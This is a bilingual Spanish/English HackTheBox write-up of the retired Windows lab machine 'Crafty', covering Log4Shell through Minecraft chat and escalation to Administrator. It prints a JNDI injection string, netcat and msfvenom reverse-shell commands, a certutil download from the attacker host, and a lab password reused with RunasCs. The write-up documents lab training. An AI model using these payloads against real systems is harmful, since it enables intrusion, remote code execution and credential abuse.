# Crafty [Easy]

> **ES:** Máquina Windows fácil: un servidor Minecraft 1.16.5 vulnerable a Log4Shell da acceso, y una contraseña en un plugin lleva a Administrator.
> **EN:** Easy Windows machine: a Minecraft 1.16.5 server vulnerable to Log4Shell gives access, and a password inside a plugin leads to Administrator.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Windows |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Crafty] |
| **URL** | https://app.hackthebox.com/machines/Crafty |
| **IP lab** | 10.10.11.249 |
| **Fecha de resolución** | 2024-03-27 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Log4Shell (CVE-2021-44228) en el chat de Minecraft → password en plugin → RunasCs a Administrator.
> **EN:** Get `user.txt` and `root.txt` via Log4Shell (CVE-2021-44228) in the Minecraft chat → password in plugin → RunasCs to Administrator.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] pyCraft / Minecraft-Console-Client (cliente Minecraft)
- [ ] log4j-shell-poc (LDAP + web server, JDK 8u20)
- [ ] msfvenom / metasploit (meterpreter)
- [ ] jd-gui / jadx (reversing del plugin)
- [ ] smbserver.py (exfiltración) / meterpreter `download`
- [ ] RunasCs

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** El escaneo inicial solo muestra IIS en 80 (redirige a `crafty.htb`); el escaneo completo revela Minecraft en 25565. La versión del juego delata Log4j vulnerable. La web menciona además `play.crafty.htb`, que redirige a `crafty.htb`.
> **EN:** The initial scan only shows IIS on 80 (redirects to `crafty.htb`); the full scan reveals Minecraft on 25565. The game version hints at vulnerable Log4j. The site also mentions `play.crafty.htb`, which redirects to `crafty.htb`.

```bash
nmap -sC -sV -Pn 10.10.11.249 -oN nmap.txt
nmap -p- --min-rate 10000 10.10.11.249
nmap -p 80,25565 -sCV 10.10.11.249
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 80/tcp IIS 10.0 ("Crafty - Official Website"), 25565/tcp Minecraft 1.16.5 (Protocol 127, "Crafty Server"). Windows (Server 2019, build 17763). Capturas de la web en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El servidor acepta conexiones offline (pyCraft o Minecraft-Console-Client). El chat del juego registra con Log4j, candidato a CVE-2021-44228. El PoC `kozmer/log4j-shell-poc` exige JDK 8u20 y hay que cambiar `/bin/bash` por `cmd.exe` porque el objetivo es Windows.
> **EN:** The server accepts offline connections (pyCraft or Minecraft-Console-Client). The game chat logs with Log4j, a CVE-2021-44228 candidate. The `kozmer/log4j-shell-poc` PoC requires JDK 8u20 and `/bin/bash` must be changed to `cmd.exe` since the target is Windows.

```bash
python3 start.py
# usuario cualquiera, modo offline, host 10.10.11.249 -> Connected.
python3 poc.py --userip <TU-IP> --webport 80 --lport 9999
```

**Resultado / Result:** Conexión al servidor de juego confirmada como punto de inyección. Capturas del PoC en `images/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Se levanta LDAP+HTTP del PoC y se envía `${jndi:ldap://<TU-IP>:1389/a}` por el chat; el servidor carga la clase (`GET /Exploit.class 200`) y devuelve shell como `svc_minecraft`.
> **EN:** Start the PoC LDAP+HTTP servers and send `${jndi:ldap://<YOUR-IP>:1389/a}` via chat; the server loads the class (`GET /Exploit.class 200`) and returns shell as `svc_minecraft`.

```bash
python3 poc.py --userip <TU-IP> --webport 80 --lport 9999
rlwrap nc -lvnp 9999
# en el cliente Minecraft enviar: ${jndi:ldap://<TU-IP>:1389/a}
# c:\users\svc_minecraft\server>whoami  -> crafty\svc_minecraft
```

**Resultado / Result:** Shell como `crafty\svc_minecraft` en `C:\users\svc_minecraft\server`. Se estabiliza subiendo un meterpreter (`msfvenom windows/x64/meterpreter/reverse_tcp` + `certutil -urlcache -f http://<TU-IP>/exp-8888.exe` + `multi/handler`): `CRAFTY`, Windows Server 2019 x64.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El escritorio de `svc_minecraft` contiene `user.txt`.
> **EN:** `svc_minecraft`'s desktop contains `user.txt`.

```bash
type C:\users\svc_minecraft\Desktop\user.txt  # formato: e706... (ofuscado)
```

**Resultado / Result:** `user.txt` leído (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** En `C:\users\svc_minecraft\server\plugins` hay un único plugin propio (`playercounter-1.0-SNAPSHOT.jar`, 9996 B, md5 `349f6584e18cd85fc9e014da154efe03`); se exfiltra (meterpreter `download` o `smbserver.py` + `net use`/`copy`) y al descompilarlo (`jd-gui`/jadx, `plugin.yml` → `htb.crafty.playercounter.Playercounter`) aparece la contraseña RCON hardcodeada `s67u84zKq8IXw` (credencial de laboratorio retirado), reutilizada como clave de Administrator con RunasCs para lanzar un segundo meterpreter elevado. El `server.jar` (md5 `C10B74188EFC4ED6960DB49C9ADE50CE`) es el servidor vanilla.
> **EN:** In `C:\users\svc_minecraft\server\plugins` there is a single custom plugin (`playercounter-1.0-SNAPSHOT.jar`, 9996 B, md5 `349f6584e18cd85fc9e014da154efe03`); exfiltrate it (meterpreter `download` or `smbserver.py` + `net use`/`copy`) and decompiling it (`jd-gui`/jadx, `plugin.yml` → `htb.crafty.playercounter.Playercounter`) reveals the hardcoded RCON password `s67u84zKq8IXw` (retired-lab credential), reused as the Administrator password with RunasCs to launch a second elevated meterpreter. The `server.jar` (md5 `C10B74188EFC4ED6960DB49C9ADE50CE`) is the vanilla server.

```bash
# meterpreter sesion 1
ls C:\users\svc_minecraft\server\plugins  # playercounter-1.0-SNAPSHOT.jar
download playercounter-1.0-SNAPSHOT.jar
# local: jd-gui playercounter-1.0-SNAPSHOT.jar
# Playercounter.class: new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes())
# escribe el conteo en C:\inetpub\wwwroot\playercount.txt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU-IP> LPORT=7777 -f exe -o exp-7777.exe
# subir exp-7777.exe y RunasCs.exe (meterpreter upload / certutil), listener en 7777
.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"  # -> crafty\administrator
.\RunasCs.exe Administrator s67u84zKq8IXw exp-7777.exe
# meterpreter > getuid  -> CRAFTY\Administrator
cat C:\users\administrator\desktop\root.txt  # formato: f513... (ofuscado)
```

**Resultado / Result:** Sesión como `CRAFTY\Administrator` → `root.txt` (flag no reproducida). Técnica: secreto hardcodeado + RunAs. Captura del reversing en `img/image_20240356-175646.png` y en `images/`.

---

## 🧠 Lo aprendido / Learned

> **ES:** Servicios no-HTTP (Minecraft) también son superficie Log4Shell; estabilizar con meterpreter ayuda a exfiltrar; los plugins custom esconden secretos; RunasCs permite reutilizar credenciales sin RDP.
> **EN:** Non-HTTP services (Minecraft) are Log4Shell surface too; stabilizing with meterpreter helps exfiltration; custom plugins hide secrets; RunasCs reuses credentials without RDP.

- [ ] Log4Shell (CVE-2021-44228) vía chat de Minecraft
- [ ] Estabilización con meterpreter vía `certutil`
- [ ] Reversing de plugin Java (jadx/jd-gui) y secreto hardcodeado
- [ ] Escalado con RunasCs a Administrator

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada. Nota: la nota china indica OS Windows, coincidente con la fuente oficial; sin contradicción.
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: nmap completo, `play.crafty.htb`, hash `server.jar`, exfiltración por SMB, `Playercounter.class`) — wither/nota migrada
- **Referencia técnica:** CVE-2021-44228 (Log4Shell) — https://nvd.nist.gov/vuln/detail/CVE-2021-44228 — NIST NVD (PoC: https://github.com/kozmer/log4j-shell-poc — kozmer; cliente: https://github.com/ammaraskar/pyCraft — ammaraskar; RunasCs: https://github.com/antonioCoco/RunasCs — antonioCoco)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
